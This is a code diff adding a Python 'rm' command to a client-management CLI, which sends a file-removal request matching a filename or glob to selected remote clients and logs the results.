@@ -1,0 +1,73 @@
+from shared.logger import Log
+from shared.ops import CliOp
+from shared.protocol import Commands
+
+class RemoveOp(CliOp):
+    name = "rm"
+    syntax = "<targets> <filename|glob>"
+
+    async def handle(
+            self,
+            targets: list = [],
+            file: str = None,
+            is_cmd: bool = False,
+            cmd_parts: list = []
+    ):
+        if is_cmd:
+            targets, file = self.parse(cmd_parts)
+
+            if not targets:
+                return
+
+            targets = self.owner.parse_targets(targets)
+
+            if not targets:
+                Log.warning("No client(s) found matching the query")
+                return
+
+            if file == "all":
+                Log.warning("'rm all' is deprecated, use 'rm *' instead. This will be removed in a future release.")
+                file = "*.wav" # old behavior only deleted .wav files
+
+
+        results = {'deleted': [], 'failed': []}
+
+        Log.info(f"Removing '{file}' from {len(targets)} client(s)...")
+                
+        for client_id in targets:
+            if client_id not in self.owner.clients:
+                Log.error(f"  {client_id}: Client not found")
+                results["failed"].append(client_id)
+                continue
+            
+            client = self.owner.clients[client_id]
+
+            try:
+                response = await client.proto.send(Commands.REMOVE_FILE, filename=file)
+
+                msg = response['kwargs'].get('message', 'File deleted')
+                Log.success(f"  {client.get_display_name()}: {msg}")
+
+                results['deleted'].append(client_id)
+            
+            except TimeoutError:
+                Log.error(f"  {client_id}: Response timeout")
+                results['failed'].append(client_id)
+
+            except RuntimeError as e:
+                Log.error(f"  {client_id}: {e}")
+                results['failed'].append(client_id)
+
+        Log.print("")
+        Log.info(f"Success: {len(results['deleted'])}, Failure: {len(results['failed'])}")
+
+
+    def parse(self, cmd_parts):
+        if len(cmd_parts) < 2:
+            Log.error("Usage: rm <targets> <filename|glob>")
+            return (None, None)
+
+        return (cmd_parts[0], cmd_parts[1])
+
+def setup(reg):
+    reg.register(RemoveOp)
